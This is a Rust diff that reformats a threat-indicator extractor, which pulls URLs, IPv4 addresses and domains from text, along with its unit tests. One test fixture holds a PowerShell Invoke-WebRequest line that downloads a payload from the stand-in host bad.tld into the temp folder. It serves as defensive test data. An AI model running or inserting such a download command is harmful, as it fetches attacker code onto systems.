@@ -49,7 +49,9 @@ fn extract_urls(content: &str, ind: &mut Indicators) {
             let start = pos;
             let rest = &search[start..];
             let end = rest
-                .find(|c: char| c.is_whitespace() || matches!(c, '"' | '\'' | '`' | ')' | ']' | '>'))
+                .find(|c: char| {
+                    c.is_whitespace() || matches!(c, '"' | '\'' | '`' | ')' | ']' | '>')
+                })
                 .unwrap_or(rest.len());
             let url = rest[..end].trim_end_matches(&['.', ',', ';', '\'', '"'][..]);
             if url.len() > marker.len() + 2 {
@@ -97,9 +99,11 @@ fn try_parse_ipv4(bytes: &[u8]) -> Option<(String, usize)> {
     let s = std::str::from_utf8(bytes).ok()?;
     let mut parts = [0u32; 4];
     let mut pos = 0usize;
-    for p in 0..4 {
+    for (p, part) in parts.iter_mut().enumerate() {
         let rest = &s[pos..];
-        let num_end = rest.find(|c: char| !c.is_ascii_digit()).unwrap_or(rest.len());
+        let num_end = rest
+            .find(|c: char| !c.is_ascii_digit())
+            .unwrap_or(rest.len());
         if num_end == 0 || num_end > 3 {
             return None;
         }
@@ -107,7 +111,7 @@ fn try_parse_ipv4(bytes: &[u8]) -> Option<(String, usize)> {
         if num > 255 {
             return None;
         }
-        parts[p] = num;
+        *part = num;
         pos += num_end;
         if p < 3 {
             if pos >= s.len() || s.as_bytes()[pos] != b'.' {
@@ -127,7 +131,9 @@ fn try_parse_ipv4(bytes: &[u8]) -> Option<(String, usize)> {
     let mut consumed = pos;
     if pos < s.len() && s.as_bytes()[pos] == b':' {
         let port_str = &s[pos + 1..];
-        let port_end = port_str.find(|c: char| !c.is_ascii_digit()).unwrap_or(port_str.len());
+        let port_end = port_str
+            .find(|c: char| !c.is_ascii_digit())
+            .unwrap_or(port_str.len());
         if port_end > 0 && port_end <= 5 {
             if let Ok(port) = port_str[..port_end].parse::<u16>() {
                 full = format!("{}:{}", full, port);
@@ -141,10 +147,7 @@ fn try_parse_ipv4(bytes: &[u8]) -> Option<(String, usize)> {
 /// Renvoie true si l'IP est dans une plage privée RFC-1918 ou loopback.
 fn is_rfc1918(ip: &str) -> bool {
     let base = ip.split(':').next().unwrap_or(ip);
-    let parts: Vec<u8> = base
-        .split('.')
-        .filter_map(|s| s.parse().ok())
-        .collect();
+    let parts: Vec<u8> = base.split('.').filter_map(|s| s.parse().ok()).collect();
     if parts.len() != 4 {
         return false;
     }
@@ -165,7 +168,9 @@ $url = "https://evil.example/drop.exe"
 Invoke-WebRequest -Uri 'http://bad.tld/payload.bin' -OutFile $env:TEMP
 "#;
         let ind = extract_from_text(content);
-        assert!(ind.urls.contains(&"https://evil.example/drop.exe".to_string()));
+        assert!(ind
+            .urls
+            .contains(&"https://evil.example/drop.exe".to_string()));
         assert!(ind.urls.contains(&"http://bad.tld/payload.bin".to_string()));
         assert!(ind.domains.contains(&"evil.example".to_string()));
     }
@@ -203,6 +208,12 @@ Invoke-WebRequest -Uri 'http://bad.tld/payload.bin' -OutFile $env:TEMP
     fn pas_de_doublon_url() {
         let content = "https://evil.example/x https://evil.example/x";
         let ind = extract_from_text(content);
-        assert_eq!(ind.urls.iter().filter(|u| u.contains("evil.example/x")).count(), 1);
+        assert_eq!(
+            ind.urls
+                .iter()
+                .filter(|u| u.contains("evil.example/x"))
+                .count(),
+            1
+        );
     }
 }
